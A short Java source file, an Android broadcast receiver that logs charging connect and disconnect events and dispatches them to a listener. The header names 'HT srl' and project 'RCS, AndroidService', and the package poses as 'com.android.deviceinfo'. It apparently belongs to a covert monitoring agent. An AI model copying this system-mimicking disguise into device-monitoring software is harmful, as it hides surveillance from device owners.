/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorAc.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.android.deviceinfo.Ac;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class BAc extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorAc"; //$NON-NLS-1$

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
			}

			return;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " power notification, action: " + intent.getAction());//$NON-NLS-1$
		}

		final boolean plugged = intent.getAction().equals(Intent.ACTION_POWER_CONNECTED);

		ListenerAc.self().dispatch(new Ac(plugged));
	}
}